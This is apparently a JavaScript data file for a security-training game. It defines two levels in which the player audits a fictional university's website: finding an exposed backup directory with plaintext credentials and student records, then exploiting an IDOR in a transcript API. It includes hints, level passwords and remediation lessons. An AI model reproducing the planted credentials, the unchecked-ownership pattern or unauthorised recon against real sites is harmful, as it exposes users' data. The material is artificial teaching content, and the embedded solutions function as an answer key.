// Web track levels.
//
// See levels/linux.js for the full schema documentation. Web-specific
// fields used by js/commands/web.js:
//
//   web           — map of URL → response body string (for `curl <url>`).
//   webHeaders    — map of URL → headers object (for `curl -I <url>`).
//                   The HTTP/1.1 status goes in under the special key
//                   "HTTP/1.1", e.g. { "HTTP/1.1": "200 OK", ... }.
//   gobusterRes   — map of URL → array of result lines for `gobuster <url>`.
//                   Each entry is a single line like
//                   "/admin                (Status: 401) [Size: 287]".
//   cookieData    — map of URL → { name: value } cookie jar (for `cookies`).
//
// Continuity: all levels are set at Driftwood Systems, a mid-sized tech
// consulting firm. Each track introduces a new client engagement to
// diversify the post-mortems' compliance contexts (FERPA here, for the
// Meridian State University engagement).

export const webLevels = {

  // ── level 0 — "Meridian's Forgotten Backup Folder" ───────────────
  // The player's first web-recon task: a cyber-insurance carrier has
  // asked Meridian State University for a third-party web audit ahead
  // of policy renewal. The university's in-house web dev (Carlos)
  // inherited a public web stack from a dismissed agency (BluePier
  // Digital). gobuster reveals that BluePier left a /backup/ directory
  // with autoindex on, containing a CSV of student records (FERPA
  // violation) and a plaintext DB credential breadcrumb. The lesson is
  // CWE-548 (Information Exposure Through Directory Listing) / CWE-552
  // (Files or Directories Accessible to External Parties), mapped to
  // FERPA (34 CFR Part 99), NIST 800-171, and OWASP A05 (Security
  // Misconfiguration). Introduces `gobuster` and `curl`.
  "level0@web": {
    password: null,
    track: "web",
    title: "Meridian's exposed backup",
    estimatedMinutes: 10,
    playerUser: "secops",
    objective: "Audit Meridian State University's public web stack ahead of their cyber-insurance renewal. Find anything BluePier Digital left behind that the carrier's reviewer would flag.",
    lesson: "Meridian State University is one of Driftwood's smaller clients — public regional uni in Oregon, ~30,000 students, FERPA in scope across all student-record systems. Their cyber-insurance policy is up for renewal and the carrier requires a third-party web audit as a renewal condition. Carlos, Meridian's in-house web developer, inherited the public web stack from a dismissed agency (BluePier Digital) that left work-product files scattered on the production server. He's been cleaning them up but suspects he hasn't caught all of them. You're on Driftwood's web-audit workstation (the shell calls you `secops`, the shared service account the security team uses for client recon). Read welcome.md first — it explains gobuster. Then read engagement-notes.md, then meridian-scope.txt, then start enumerating. Read lessons-learned.md once you've found the FERPA-grade exposure.",

    hints: [
      "Read `engagement-notes.md` + `meridian-scope.txt` for scope, then enumerate paths with `gobuster <site-url>`. Watch for a directory that returns `200` with a listing.",
      "BluePier left a `/backup/` directory with autoindex (directory listing) turned ON. `curl https://www.meridian.edu/backup/` to see what's inside.",
      "Read `/backup/db-creds.txt` — the production DB credential there is the FERPA-grade exposure, and it's your password into `level1@web`.",
    ],

    // v1.10.0 BONUS FINDS — robots.txt as inadvertent attack-surface
    // billboard. Orthogonal to the autoindex finding; the bonus
    // requires a brief detour off the gobuster path.
    bonusFinds: [
      {
        id:   "robots-txt-billboard",
        name: "robots.txt as an attacker's site map",
        hint: "robots.txt lists /admin/, /backup/, /staging/, /private/ — every path Meridian wanted hidden. Disallow doesn't hide; it announces. Every reconnaissance script reads robots.txt first. If a path is sensitive, removing the link is what hides it. Adding a Disallow line is what advertises it.",
        trigger: { command: "curl", argMatches: /robots\.txt/, outputContains: "Disallow: /backup/" },
      },
    ],
    web: {
      "https://www.meridian.edu":
`<!DOCTYPE html>
<html lang="en">
<head><title>Meridian State University — A public university in the Pacific Northwest</title></head>
<body>
<h1>Meridian State University</h1>
<p>Founded 1893. ~30,000 students. Cedarbrook, Oregon.</p>
<nav>
  <a href="/about">About</a>
  <a href="/admissions">Admissions</a>
  <a href="/financial-aid">Financial Aid</a>
  <a href="/student-portal">Student Portal</a>
  <a href="/contact">Contact</a>
</nav>
<p>Welcome to Meridian. Apply by January 15 for fall enrollment.</p>
</body>
</html>`,
      "https://www.meridian.edu/":
`<!DOCTYPE html>
<html lang="en">
<head><title>Meridian State University — A public university in the Pacific Northwest</title></head>
<body>
<h1>Meridian State University</h1>
<p>Founded 1893. ~30,000 students. Cedarbrook, Oregon.</p>
<nav>
  <a href="/about">About</a>
  <a href="/admissions">Admissions</a>
  <a href="/financial-aid">Financial Aid</a>
  <a href="/student-portal">Student Portal</a>
  <a href="/contact">Contact</a>
</nav>
<p>Welcome to Meridian. Apply by January 15 for fall enrollment.</p>
</body>
</html>`,
      "https://www.meridian.edu/robots.txt":
`User-agent: *
Disallow: /admin/
Disallow: /backup/
Disallow: /staging/
Disallow: /private/

Sitemap: https://www.meridian.edu/sitemap.xml`,
      "https://www.meridian.edu/admin":
`<html>
<head><title>401 Unauthorized</title></head>
<body>
<h1>401 Unauthorized</h1>
<p>Authentication is required to access this resource. Contact the Meridian IT helpdesk if you need access.</p>
</body>
</html>`,
      "https://www.meridian.edu/backup":
`<html>
<head><title>Index of /backup</title></head>
<body>
<h1>Index of /backup</h1>
<hr>
<pre>
<a href="../">../</a>
<a href="README.txt">README.txt</a>                  2023-08-14 11:42      1.2K
<a href="db-creds.txt">db-creds.txt</a>                2023-08-14 11:43       128
<a href="students_export_2023.csv">students_export_2023.csv</a>    2023-08-14 11:38      482K
</pre>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at www.meridian.edu Port 443</address>
</body>
</html>`,
      "https://www.meridian.edu/backup/":
`<html>
<head><title>Index of /backup</title></head>
<body>
<h1>Index of /backup</h1>
<hr>
<pre>
<a href="../">../</a>
<a href="README.txt">README.txt</a>                  2023-08-14 11:42      1.2K
<a href="db-creds.txt">db-creds.txt</a>                2023-08-14 11:43       128
<a href="students_export_2023.csv">students_export_2023.csv</a>    2023-08-14 11:38      482K
</pre>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at www.meridian.edu Port 443</address>
</body>
</html>`,
      "https://www.meridian.edu/backup/README.txt":
`BluePier Digital — Meridian University engagement
Working directory for deploy artifacts and DB exports.

This directory lives on the production server's filesystem at
/var/www/meridian/public/backup/ and is excluded from the
site's static-build .gitignore. It is NOT excluded from Apache's
autoindex configuration, which is on by default in /etc/apache2/
mods-enabled/autoindex.conf for any directory under DocumentRoot
that does not contain an index.html.

Files here are leftover work-product from the 2023 deploy cycle.
Will clean up after final invoice is paid.
                                                — James, 2023-08-14`,
      "https://www.meridian.edu/backup/db-creds.txt":
`BluePier Digital — Meridian webapp environment notes
Last updated by James 2023-08-14

== Production DB (mysql) ==
Host:     db.meridian.edu (internal only, port 3306)
User:     webapp_admin
Pass:     M3rid14n!2023-prod
DB name:  meridian_portal

NOTE FOR HANDOFF: rotate this before final acceptance.
                  Carlos's team needs to pick a new value.
                  Reminder: this credential is also baked into
                  the staging deployment until we cut over.`,
      "https://www.meridian.edu/backup/students_export_2023.csv":
`student_id,first_name,last_name,email,major,gpa
M-1872941,Aisha,Patel,patel.a@meridian.edu,Computer Science,3.91
M-1872995,Marcus,Reyes,reyes.m@meridian.edu,Biology,3.42
M-1873041,Jordan,Smith,smith.j@meridian.edu,Mechanical Engineering,2.88
M-1873100,Linh,Tran,tran.l@meridian.edu,English Literature,3.76
M-1873112,Tyler,Brooks,brooks.t@meridian.edu,Computer Science,3.05
M-1873198,Sara,Kapoor,kapoor.s@meridian.edu,Pre-Med,3.94
M-1873220,Dmitri,Volkov,volkov.d@meridian.edu,Physics,3.61
M-1873244,Olivia,Chen,chen.o@meridian.edu,Music Performance,3.88

[output truncated — file contains 4,217 records totaling 482 KB]`,
    },
    webHeaders: {
      "https://www.meridian.edu": {
        "HTTP/1.1": "200 OK",
        "Server": "Apache/2.4.41 (Ubuntu)",
        "Content-Type": "text/html; charset=UTF-8",
        "Content-Length": "412",
      },
      "https://www.meridian.edu/backup/": {
        "HTTP/1.1": "200 OK",
        "Server": "Apache/2.4.41 (Ubuntu)",
        "Content-Type": "text/html; charset=UTF-8",
      },
      "https://www.meridian.edu/admin": {
        "HTTP/1.1": "401 Unauthorized",
        "Server": "Apache/2.4.41 (Ubuntu)",
        "WWW-Authenticate": "Basic realm=\"Meridian Admin\"",
        "Content-Type": "text/html; charset=UTF-8",
      },
    },
    gobusterRes: {
      "https://www.meridian.edu": [
        "/                     (Status: 200) [Size: 412]",
        "/about                (Status: 200) [Size: 8412]",
        "/admin                (Status: 401) [Size: 287]",
        "/admissions           (Status: 200) [Size: 12104]",
        "/backup               (Status: 200) [Size: 1183]",
        "/contact              (Status: 200) [Size: 4521]",
        "/financial-aid        (Status: 200) [Size: 9876]",
        "/login                (Status: 200) [Size: 2018]",
        "/robots.txt           (Status: 200) [Size: 142]",
        "/student-portal       (Status: 302) [Size: 0]",
      ],
    },
    fs: {
      type: "dir",
      children: {

        "welcome.md": {
          type: "file",
          content:
`─── Driftwood Systems / Web Audit Workstation ─────────────────

You're logged in as \`secops\` — the security team's shared service
account. The host \`web\` is our audit workstation for client web
reconnaissance.

Today's client: Meridian State University. Their cyber-insurance
carrier requires a third-party web audit before policy renewal.
Carlos (their in-house web dev) suspects a dismissed agency left
artifacts on the production server he hasn't cleaned up. Find
them.


─── NEW COMMANDS ──────────────────────────────────────────────

  gobuster <url>     Brute-force-discover hidden URL paths using
                     a built-in wordlist of common names.

  curl <url>         Fetch a URL and print the response body.
                     The browser-less way to look at a page.

  curl -I <url>      Fetch only the response headers (no body).


─── WHAT GOBUSTER DOES ────────────────────────────────────────

Web servers expose URLs. Some are linked from the site nav
(/about, /admissions). Others aren't linked anywhere but still
respond when asked: an old admin panel, a staging API, a backup
directory nobody removed.

gobuster fires HTTP requests at ~4,600 common path names from
/usr/share/wordlists/dirb/common.txt and reports which ones the
server answered for.

Status codes you'll see:

  200    OK — path exists, server returned content.
         Anything 200 you didn't intend to expose is a finding.
  302    Redirect — path exists; server sends you elsewhere.
         Usually fine (e.g. login walls, http → https).
  401    Unauthorized — path exists, requires auth. Good.
  403    Forbidden — path exists, access blocked. Also fine.
  404    Not found — gobuster filters these out by default.


─── HOW TO PLAY ───────────────────────────────────────────────

  1.  cat engagement-notes.md     Meridian / Carlos / FERPA
  2.  cat meridian-scope.txt      The URL in scope today
  3.  gobuster <that URL>         Enumerate paths
  4.  curl <interesting path>     Confirm the finding
  5.  cat lessons-learned.md      Post-mortem (read after step 4)`
        },

        "engagement-notes.md": {
          type: "file",
          content:
`# Meridian State University — engagement notes

Client: Meridian State University
Vertical: Higher education (public regional university, ~30,000
          students, Cedarbrook, Oregon)
Engagement: New (this is our first piece of work for them)
Driftwood handler: Priya
Client counterpart: Carlos (in-house web developer, ~8 months
                    in role)
Compliance regime: FERPA (Family Educational Rights and Privacy
                   Act, 20 U.S.C. § 1232g; 34 CFR Part 99).
                   Applies to all "education records" containing
                   personally-identifiable information about
                   currently-enrolled or formerly-enrolled
                   students. Meridian receives federal financial
                   aid, so FERPA is non-negotiable. GLBA also
                   applies to the financial aid office's records;
                   HIPAA applies to the student health center.
                   Today's audit is scoped to FERPA-bearing
                   surface area on the public web.

## How this engagement happened

Meridian's cyber-insurance carrier (Cedarwood Mutual) notified
them in March that their policy is up for renewal in July and
that the renewal terms now require a third-party web audit. This
is becoming the norm across cyber-insurance — the carriers got
tired of paying out on directory-traversal and exposed-backup
incidents at universities and started writing audits into the
renewal checklist.

Meridian asked their existing vendors first; none had capacity in
this quarter. They found Driftwood through the Pacific Northwest
public-higher-ed mailing list. This is our first engagement with
them, and Priya is keen on it converting into ongoing work.

## What Carlos told us

Carlos came on as Meridian's in-house web developer eight months
ago. Before him, Meridian outsourced the public web stack to
BluePier Digital — a Bay Area agency that built the current site
in 2021. The relationship ended in 2024 after a contract dispute
about scope and final invoicing.

When Carlos took over the production server, he found a sprawl
of leftover work-product files: zipped deploy artifacts, draft
content, scratch directories, a couple of \`.env\` files in
places they shouldn't have been. He's been finding and removing
them as he runs into them. He told Priya, verbatim:

  "There's definitely more I haven't found. I've been doing this
   solo. If you're going to scan the site I'd rather you find
   what's left now than have the insurance carrier find it later."

Carlos is sympathetic. He inherited a mess. The agency that made
the mess is no longer reachable and was not contractually obligated
to clean up at exit (the contract dispute happened before any final
handoff was agreed).

## Scope for today

See meridian-scope.txt. One hostname (the main public site).
Carlos has authorized active recon against it — he's already
told the SOC that scans from Driftwood's source IP block are
expected this week.

## Why FERPA matters here

FERPA is a different beast from HIPAA or PCI-DSS — it has no fine
schedule. The enforcement mechanism is "the federal government can
withdraw your funding," which is existential for a public
university. Roughly: any disclosure of a student's "education
record" (grades, enrollment, financial aid, disciplinary records,
contact info beyond directory data) to a party without legitimate
educational interest is a violation. Meridian's annual FSA
(Federal Student Aid) reporting includes a compliance attestation.

If we find student records exposed to the open internet, that's
not just an insurance-renewal risk — it's a federal-funding risk.
Surface it with the right urgency.

— Priya`
        },

        "meridian-scope.txt": {
          type: "file",
          content:
`# Meridian State University — web audit scope
# Public-facing hostname authorized for active recon under
# this engagement.

  https://www.meridian.edu   main public site (marketing, admissions,
                             student portal entry, financial-aid info)

# Out of scope (per Carlos):
#   - Any *.meridian.edu hostname other than www.
#   - The student portal application itself (portal.meridian.edu)
#     — that's behind SSO and contractually a separate audit.
#   - Internal hostnames (db.*, jumphost.*, etc).
#
# Today's audit is "what does the open internet see when it looks
# at www.meridian.edu?" Enumerate paths with gobuster, fetch the
# interesting ones with curl, write up what shouldn't be there.
#
# Last updated: 2026-05-20 — Priya (post-kickoff with Carlos)`
        },

        "lessons-learned.md": {
          type: "file",
          content:
`══════════════════════════════════════════════════════════════
  POST-MORTEM — what you just found, and why it matters
══════════════════════════════════════════════════════════════

You just confirmed that Meridian State University's public web
server is hosting — at a guessable URL with autoindex enabled —
a CSV of 4,217 student records (names, IDs, emails, majors, GPAs)
left behind by a dismissed agency two years ago. You also found
a plaintext database credential in the same directory that the
agency's parting note explicitly said needed rotation, and which
almost certainly was never rotated.

The student records alone are a FERPA-grade exposure. The
combination — exposure plus a live credential to the internal
database — is the kind of finding that becomes a published
breach disclosure if an attacker gets there before a defender does.

─── THE BLUNT VERSION ────────────────────────────────────────

Two distinct failures stack on top of each other in this finding,
and both are textbook:

  1. AUTOINDEX. Apache (and nginx, and IIS) will, by default in
     many distributions, render a browseable directory listing
     for any URL that resolves to a directory containing no
     \`index.html\`. A request to \`/backup/\` returns the contents
     of the filesystem directory at \`/var/www/.../backup/\`.
     Nobody linked to that URL. Nobody published it. The web
     server published it the moment the directory was created
     without an index file.

  2. STORING ARTIFACTS UNDER DOCUMENTROOT. The directory shouldn't
     have been served at all. The agency put working files in a
     subdirectory of the public web root because that was the
     most convenient place to scp things to. Once a file lives
     under DocumentRoot, it is — by definition — published on the
     internet, regardless of whether anyone shared the URL.

Each of these is a security misconfiguration. Together, they are
the most common cause of "credential leak from a public web
server" incidents in published breach reports. Source-code
backups, .git directories, database dumps, .env files, and "old
admin panel I forgot about" all show up here.

The robots.txt entry is, separately, an own goal:

    Disallow: /backup/

That line was meant to keep crawlers out of /backup/. What it
actually does is publish a list of the exact URLs the defender
considers sensitive. Every reconnaissance script reads robots.txt
first. "Security through robots.txt" is a category mistake.

─── THE CONSULTING-FIRM ANGLE ────────────────────────────────

For Meridian specifically, this finding lands in two places at
once:

  - INSURANCE: Cedarwood Mutual asked for an audit before
    renewal. The audit found exactly the class of issue the
    carriers are pricing into renewals. The right play is to
    surface this to Carlos today, give him 24 hours to remediate
    (the fix is "rm -r /var/www/meridian/public/backup && systemctl
    reload apache2 && rotate the DB credential"), and then write
    up the finding plus the remediation in the same document.
    The carrier sees that the audit caught the issue AND that
    remediation happened; renewal goes through.

  - FERPA: Student records were exposed to anyone with curl and
    a guessable URL. Meridian's general counsel needs to know
    today. FERPA does not have a hard breach-notification clock
    like HIPAA's 60 days, but the Department of Education's
    Privacy Technical Assistance Center expects affected students
    to be notified "in a reasonable time" and offers a notification
    template. The federal financial aid attestation is annual; a
    documented exposure has to be disclosed in the next cycle.

For Driftwood: Carlos is sympathetic. The mess wasn't his — he
inherited it. The conversation should not start with "you have a
problem"; it should start with "we found what BluePier left."
That tonal difference is the difference between Driftwood landing
ongoing work with Meridian and not landing it.

─── FRAMEWORKS THAT COVER THIS ───────────────────────────────

Three weaknesses stacked, plus the credential.

  CWE-548   Exposure of Information Through Directory Listing —
            the proximate cause.
  CWE-668   Exposure of Resource to Wrong Sphere — working files
            under DocumentRoot, which is the root cause.
  CWE-798   Use of Hard-coded Credentials — the DB password in
            the same directory.

  NIST SP 800-53 CM-6 (Configuration Settings) and AC-3 are the
  controls. robots.txt is not one of them: it is a request to
  crawlers, and it publishes the path to anyone who reads it.

  FERPA is the regime, and it carries NO breach-notification
  duty and no fine schedule. Enforcement runs through the
  Department of Education's funding-withdrawal authority and the
  annual FSA attestation. Any notification clock here comes from
  STATE law attaching to the PII. Two exposures, two timelines.

─── MITRE ATT&CK MAPPING ─────────────────────────────────────

What you simulated maps to:

  T1083    — File and Directory Discovery. Enumerating paths
             on the target, which is what gobuster does.
  T1595.003 — Active Scanning: Wordlist Scanning. The specific
             sub-technique for directory brute-forcing.
  T1190    — Exploit Public-Facing Application. What an
             attacker does with the credential leak you found.
  T1078    — Valid Accounts. The DB credential combined with
             the internal database reachable from any host
             inside Meridian's network.

T1595.003 is the canonical opening move in published reports of
"attacker exfiltrated database via exposed credentials in a
publicly-accessible backup directory." That's not a rare incident
pattern; it's a weekly one.

─── WHAT A DEFENDER SHOULD ACTUALLY DO ───────────────────────

  1. Remove the directory. \`rm -r /var/www/meridian/public/backup/\`
     then reload Apache. Nothing in /backup/ should ever have been
     under DocumentRoot.

  2. Turn off autoindex globally. \`a2dismod autoindex\` on Debian
     /Ubuntu Apache. Then explicitly opt in any directory that's
     genuinely meant to be a public download index (most sites
     have zero such directories). The default for production
     should be off.

  3. Rotate the database credential. The value in db-creds.txt
     should be considered burned regardless of whether anyone
     was reading the file. Issue a new password, deploy it to
     every service that uses it (Carlos will need to find them
     all — start with the staging deployment the README mentioned),
     then revoke the old one.

  4. Scan the rest of DocumentRoot for similar artifacts. The
     agency's pattern is unlikely to have produced exactly one
     orphan. Tools: dirsearch / gobuster / ffuf against your own
     site with a large wordlist. \`find /var/www -name "*.bak"
     -o -name "*.sql" -o -name "*.zip" -o -name ".env*"\` against
     the filesystem. Set up Continuous Attack Surface Management
     (Detectify, Tenable ASM, Censys, Bishop Fox CAST, Microsoft
     Defender External ASM) so the next orphan is caught when
     it appears, not two years later.

  5. Fix the robots.txt. Don't list sensitive paths there. The
     way to keep something off the public internet is to not
     publish it; the way to keep it out of search engines is the
     same.

  6. Notify affected students. FERPA expects "reasonable" timing.
     The Privacy Technical Assistance Center (PTAC) at the
     Department of Education publishes a notification template;
     the general counsel will know the local IRB process.

  7. Long-term: stand up a deployment pipeline that does not let
     working files land in DocumentRoot. CI/CD that builds in
     /tmp and rsyncs only the build output to /var/www. A
     .htaccess deny-all in any directory not explicitly meant to
     be public. Code review on web-server config changes.

─── CHECK YOURSELF ───────────────────────────────────────────

Before you move on, see if you can answer these without
scrolling back. If one stalls you, that's the part worth
re-reading.

  1. 4,217 records are in the CSV. Why is that number a floor
     rather than a total?

  2. Turning autoindex off: what does it fix, and what still
     works afterwards?

  3. FERPA has no breach-notification rule. So what actually
     starts a clock here?

─── GO DEEPER ────────────────────────────────────────────────

  https://www.d3cyph3r.com/walkthroughs/web/level0.html

The walkthrough covers the full control mapping, the
certification objectives, how the finding is sized for a risk
register, the vendor-introduced exposures it mirrors, and a
Sigma rule for directory-listing responses in production.

From the terminal:    walkthrough

─── CLOSING THOUGHT ──────────────────────────────────────────

The agency that did this is gone. The mistake stayed for two
years. That gap — between "the people who made the decision
left" and "the consequence of the decision shows up" — is the
gap every web audit lives in. The fix is mundane: delete the
directory, rotate the credential, turn autoindex off, and don't
put internal files in the public web root. The harder part is
the institutional habit of catching it the first time it
happens, instead of two years later when the cyber-insurance
carrier asks.

Return to the lobby:    ssh guest@d3cyph3r`
        },

      },
    },
  },

  // ── level 1 — "Carlos's Login Wall" ──────────────────────────────
  // Day 2 at Meridian State University. Yesterday's backup-directory
  // finding closed within the hour (Carlos deleted the dir + notified
  // Cedarwood Mutual proactively); the DB credential rotation is on
  // the Friday change window. But Carlos mentioned a "quick transcript
  // download" he shipped to the student portal three weeks ago. It's
  // behind Meridian SSO. He believes that's enough. The player uses
  // the still-live DB cred from level0 to ssh into the portal webapp
  // host (with Carlos's authorization), reads Carlos's 15-line API
  // handler, sees that SSO middleware confirms identity but never
  // checks ownership of the requested student_id. Curl-ing the
  // endpoint with the 8 student IDs from level0's CSV all return
  // valid transcripts (the IDOR). A BluePier-era demo account at
  // M-0000001 carries the level2 breadcrumb credential in its
  // advisor_notes field. Lesson stack: CWE-639 (Authorization Bypass
  // Through User-Controlled Key) plus OWASP A01 (Broken Access
  // Control) and the OWASP API Security Top 10 API1 (Broken Object
  // Level Authorization — IDOR is the canonical example). No engine
  // changes — pure curl + level.web URL-map data + cookies command.
  "level1@web": {
    password: "M3rid14n!2023-prod",
    track: "web",
    title: "Carlos's login wall (IDOR)",
    estimatedMinutes: 18,
    playerUser: "webapp_admin",
    objective: "Audit Carlos's transcript-download endpoint at Meridian — confirm whether the SSO wrapper is doing the authorization work Carlos thinks it's doing, and document the blast radius if it isn't.",
    lesson: "Day two at Meridian. Yesterday's level0 backup-dir finding closed within the hour — Carlos deleted the directory and proactively notified Cedarwood Mutual (he is, increasingly, an A+ client). The `M3rid14n!2023-prod` DB credential is still live until Friday's rotation window; you used it to ssh into the student-portal webapp host with Carlos's standing authorization. You're now logged in as `webapp_admin` — the database user whose shell access was enabled six months ago for a debug session and never reverted. (That's a finding too, but not today's.) Carlos mentioned a 'quick transcript download' he shipped to the student portal last sprint — self-service for students to grab unofficial transcripts. It's behind Meridian SSO. He thinks that's enough. Priya, with Meridian's general counsel cc'd, has asked us to verify. Read welcome.md first; then priya-note.md for the day-2 context; then look at the code Carlos shipped and exercise the endpoint with curl.",

    hints: [
      "The endpoint is `curl 'https://portal.meridian.edu/api/transcript?student_id=<id>'`. welcome.md gives a real student ID to start. SSO logged you in — but does the API check WHOSE transcript you're requesting?",
      "It doesn't — that's the IDOR (authentication is not authorization). Change `student_id` to other values; `id-conventions.md` lists the ID ranges, including the old `M-000xxxx` legacy block.",
      "Request the lowest legacy ID, `M-0000001` — a leftover BluePier demo account whose `advisor_notes` field leaks the `portal-svc` credential that gates `level2@web`.",
    ],

    // v1.10.0 BONUS FINDS — surfaces the ten-year service-account
    // session token detail tucked into session.txt. Orthogonal to
    // the IDOR finding; doesn't gate the credential chain.
    bonusFinds: [
      {
        id:   "ten-year-session-token",
        name: "The ten-year service-account session",
        hint: "session.txt decodes a MeridianSSO cookie with exp:2036-04-09 — a ten-year session token issued for a 'nightly health-check job.' Long-lived service-account sessions are themselves a finding: rotation is the security property, and a ten-year TTL has effectively no rotation. Carlos's monitoring job should use a fetched-on-startup token, not a decade-old artifact.",
        trigger: { command: "cat", argMatches: /session\.txt/, outputContains: "long-lived service-account" },
      },
    ],
    cookieData: {
      "https://portal.meridian.edu": {
        "MeridianSSO": "eyJzaWQiOiJ3ZWJhcHAtc3ZjLW1vbml0b3JpbmctMjAyNiIsImV4cCI6MjA5MTM0MTY0MH0",
        "csrf": "Y2RmYTczNGItOWY4Yi00ZWQwLWFhMzgtZjQ4ZTQyZjZkM2Q0",
      },
    },
    web: {
      // Student portal home (the login page non-authenticated visitors hit).
      "https://portal.meridian.edu":
`<!DOCTYPE html>
<html lang="en">
<head><title>Meridian Student Portal — Sign in</title></head>
<body>
<h1>Meridian Student Portal</h1>
<form method="POST" action="/sso/login">
  <label>Meridian email <input type="email" name="email"></label>
  <label>Password <input type="password" name="password"></label>
  <button type="submit">Sign in via Meridian SSO</button>
</form>
<p><a href="/sso/forgot-password">Forgot password?</a></p>
<p><small>Use of this system is restricted to currently-enrolled
Meridian students and authorized staff. All activity is logged.</small></p>
</body>
</html>`,

      // The transcript endpoint — requires the captured session for the
      // narrative to make sense (the engine doesn't enforce cookies, but
      // the in-world story is that webapp_admin has the captured session
      // in session.txt and is making authenticated requests).
      //
      // The 8 IDs from level0's students_export_2023.csv all return
      // valid transcripts — that's the IDOR demonstration. Any of these
      // confirms the bug; the player only needs to try a few.
      "https://portal.meridian.edu/api/transcript?student_id=M-1872941":
`{
  "student_id": "M-1872941",
  "first_name": "Aisha",
  "last_name": "Patel",
  "email": "patel.a@meridian.edu",
  "major": "Computer Science",
  "gpa": 3.91,
  "enrollment_status": "Active",
  "courses_completed": [
    {"code": "CS-301", "name": "Algorithms", "term": "Fall 2025", "grade": "A"},
    {"code": "CS-340", "name": "Operating Systems", "term": "Fall 2025", "grade": "A-"},
    {"code": "MATH-220", "name": "Linear Algebra", "term": "Spring 2026", "grade": "A"},
    {"code": "ENGL-202", "name": "Advanced Composition", "term": "Spring 2026", "grade": "B+"}
  ],
  "advisor": "Dr. Maria Sanchez",
  "advisor_notes": "On track for May 2026 graduation. Strong candidate for graduate study; encouraged to apply to CMU and UWashington.",
  "issued_at": "2026-04-09T14:23:00Z"
}`,

      "https://portal.meridian.edu/api/transcript?student_id=M-1872995":
`{
  "student_id": "M-1872995",
  "first_name": "Marcus",
  "last_name": "Reyes",
  "email": "reyes.m@meridian.edu",
  "major": "Biology",
  "gpa": 3.42,
  "enrollment_status": "Active",
  "courses_completed": [
    {"code": "BIO-310", "name": "Cell Biology", "term": "Fall 2025", "grade": "B+"},
    {"code": "CHEM-220", "name": "Organic Chemistry II", "term": "Spring 2026", "grade": "B"}
  ],
  "advisor": "Dr. Henry Park",
  "advisor_notes": "Considering pre-med pathway; recommended additional volunteering hours at Cedarbrook Memorial.",
  "issued_at": "2026-04-09T14:23:00Z"
}`,

      "https://portal.meridian.edu/api/transcript?student_id=M-1873041":
`{
  "student_id": "M-1873041",
  "first_name": "Jordan",
  "last_name": "Smith",
  "email": "smith.j@meridian.edu",
  "major": "Mechanical Engineering",
  "gpa": 2.88,
  "enrollment_status": "Active — Academic Probation (since Spring 2026)",
  "courses_completed": [
    {"code": "ME-301", "name": "Thermodynamics", "term": "Fall 2025", "grade": "C-"},
    {"code": "ME-302", "name": "Fluid Mechanics", "term": "Spring 2026", "grade": "D+"}
  ],
  "advisor": "Dr. Henry Park",
  "advisor_notes": "Academic probation as of Spring 2026 (GPA fell below 3.0). Recommend tutoring referral + check-in with student wellness.",
  "issued_at": "2026-04-09T14:23:00Z"
}`,

      // The smoking gun: BluePier-era M-0000001 demo account whose
      // advisor_notes field carries the level2 breadcrumb credential.
      // BluePier set up this account during the 2023 transcript-portal
      // acceptance-test phase, stashed the credential in a "note for
      // handoff," never removed the account, and the student-facing UI
      // hides system-account IDs but the API doesn't filter them out.
      // Sticky-account anti-pattern (same shape as network/level1's
      // audit-bypass account, different context).
      "https://portal.meridian.edu/api/transcript?student_id=M-0000001":
`{
  "student_id": "M-0000001",
  "first_name": "Test",
  "last_name": "Student",
  "email": "test@meridian.edu",
  "major": "[SYSTEM ACCOUNT — NOT A REAL STUDENT]",
  "gpa": 4.00,
  "enrollment_status": "Service / QA Account",
  "courses_completed": [],
  "advisor": "BluePier Digital (legacy)",
  "advisor_notes": "BLUEPIER DEMO ACCOUNT — DO NOT DELETE. Created 2023-08-12 by James for transcript-portal acceptance testing. Service account for end-to-end QA: portal-svc / pw=meridian-portal-svc-2026 / used by the automated nightly check that validates the registrar integration. Carlos: don't decommission this yet, the cutover to the new check is scheduled Q4 2024. — James, BluePier 2023-08-12",
  "issued_at": "2026-04-09T14:23:00Z"
}`,

      // 404 example — proves the API does distinguish valid-but-missing
      // from valid-and-served. Helps the player understand the model.
      "https://portal.meridian.edu/api/transcript?student_id=M-9999999":
`{"error":"not found"}`,
    },

    fs: {
      type: "dir",
      children: {

        "welcome.md": {
          type: "file",
          content:
`─── Meridian Student Portal / portal.meridian.edu (webapp_admin) ──

Day two at Meridian. Yesterday's level0 finding (the BluePier
backup directory) closed within the hour — Carlos deleted the
directory the moment Priya's report landed and proactively
notified Cedarwood Mutual. He's earning his salary. The
\`M3rid14n!2023-prod\` DB credential is still live until Friday's
rotation window; you used it to ssh into the student-portal
webapp host with Carlos's standing authorization. You're logged
in as \`webapp_admin\` — the database user whose shell access
was enabled six months ago for a debug session and never
reverted. (That's a finding too, but not today's.)

During yesterday's conversation Carlos mentioned a "quick
transcript download" he'd shipped to the student portal last
sprint. Students can self-service-fetch their unofficial
transcripts. It's behind Meridian SSO. Carlos believes that's
enough. Priya — with Meridian's general counsel cc'd — has
asked us to verify.


─── COMMANDS YOU'LL USE TODAY ─────────────────────────────────

  curl <url>           Fetch a URL and print the response body.
                       (You met this in level0.)
  cookies <url>        Print the cookies your shell has set for
                       that URL. Useful for confirming the
                       authentication material you're presenting.

(No new commands; the puzzle is in how you use the ones you
already know.)


─── WHAT TO LOOK FOR ──────────────────────────────────────────

When you read transcript-api.js you'll see Carlos's verification
logic. The middleware confirms you have an active Meridian SSO
session. Once that confirmation passes, the API hands you
whatever transcript record matches the \`student_id\` URL
parameter. The middleware does not check that the student_id
matches the session's owner.

That distinction is the lesson:

  AUTHENTICATION:  "Are you a logged-in user?"
                   The SSO middleware answers this. Correctly.

  AUTHORIZATION:   "Is this record yours to access?"
                   Carlos's code never asks this question.

The vulnerability class is IDOR — Insecure Direct Object
Reference. The fix is one extra line in the handler. The blast
radius without the fix is everything in the database's
\`transcripts\` table — every currently-enrolled student, every
formerly-enrolled student, every legacy account that predates
the current enrollment system.


─── HOW TO PLAY ───────────────────────────────────────────────

  1.  cat priya-note.md           Day-two context + rules.
  2.  cat transcript-api.js       Carlos's endpoint handler.
  3.  cat session.txt             The captured SSO session.
  4.  cat id-conventions.md       Meridian's student-ID format.
  5.  cookies https://portal.meridian.edu        Confirm the session.
  6.  curl 'https://portal.meridian.edu/api/transcript?student_id=M-1872941'
       Test against student IDs you already have from level0's
       CSV. If the responses come back as transcripts, IDOR is
       confirmed. Try a few. Then try a legacy ID per
       id-conventions.md.
